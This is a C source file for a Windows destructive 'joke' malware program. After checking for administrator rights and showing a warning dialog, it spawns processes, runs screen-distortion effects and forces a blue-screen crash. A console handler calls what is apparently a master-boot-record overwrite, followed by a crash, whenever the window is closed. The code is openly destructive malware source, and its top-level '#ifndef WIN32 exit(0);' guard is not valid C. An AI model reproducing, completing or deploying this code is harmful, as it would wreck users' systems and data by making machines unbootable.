#ifndef WIN32
exit(0);
#endif

#include <windows.h>
#include "bsod.h"
#include "create_proc.h"
#include <time.h>
#include <stdlib.h>
#include <shellapi.h>
#include "payloads.h"
#include "mbr.h"

// Function declarations
BOOL IsUserAdmin();
BOOL WINAPI ConsoleHandler(DWORD dwCtrlType);
void msgBoxShow();
DWORD WINAPI GdiThread(LPVOID lpParam);

BOOL IsUserAdmin()
{
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    
    // Allocate and initialize a SID for the BUILTIN\Administrators group.
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &administratorsGroup))
    {
        // Check if the SID is enabled in the primary access token of the process.
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin))
        {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }

    return isAdmin;
}

BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    switch (dwCtrlType) {
        case CTRL_CLOSE_EVENT:
        mbr();
            bsod();
            // Perform cleanup or prompt the user
            return TRUE;
        default:
            return FALSE;
    }
}

void msgBoxShow(){
    if (MessageBoxA(NULL, "This is a very dangerous application. It Will Destroy your system. \r\r\r The creator will not be responsible for the damage.\t\t If you run this app will result in a system destroy.\nProceed with caution! ", "Warning", MB_YESNO | MB_ICONERROR) != IDYES)
        exit(0);
    else{
        createprocs();
    }
}

// Thread function for gdi()
DWORD WINAPI GdiThread(LPVOID lpParam)
{
    gdi();
    return 0;
}

int main(){
    if(IsUserAdmin()){
        msgBoxShow();
        Sleep(1000);

        // Create a thread to run gdi() in parallel
        HANDLE hGdiThread = CreateThread(NULL, 0, GdiThread, NULL, 0, NULL);
        if (hGdiThread == NULL) {
            // Handle thread creation error
            MessageBoxA(NULL, "Failed to create gdi thread.", "Error", MB_ICONERROR | MB_OK);
            exit(1);
        }

        // Set console control handler in the main thread
        SetConsoleCtrlHandler(ConsoleHandler, TRUE);

        // Wait for gdi thread to finish (optional)
        WaitForSingleObject(hGdiThread, INFINITE);

        // Close the thread handle
        CloseHandle(hGdiThread);

        Sleep(10);
        bsod();
    }
    else{
        MessageBoxA(NULL, "Admin privileges isn't detected. Check if you ran it as an admin.", "Doggy", MB_ICONINFORMATION | MB_OK);
    }
}
